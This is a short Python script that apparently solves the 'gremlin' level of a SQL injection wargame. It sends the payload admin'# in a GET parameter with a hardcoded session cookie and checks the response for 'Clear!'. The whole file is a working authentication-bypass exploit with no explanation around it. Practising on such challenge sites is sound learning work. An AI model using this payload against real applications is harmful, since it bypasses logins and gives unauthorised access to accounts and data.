#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import urllib3

session = dict(PHPSESSID="s4vu5jc61jbpk9hqh4c4vbbmg1")


def main():
	recv_exploit()


def recv_exploit():
	try:
		r = requests.post(
			"https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=" + "admin'%23",
			cookies=session)
		print("submit")
	except:
		print("exception_flag")

	if 'Clear!' in r.text:
		print("GREMLIN Clear!")


if __name__ == '__main__':
	main()
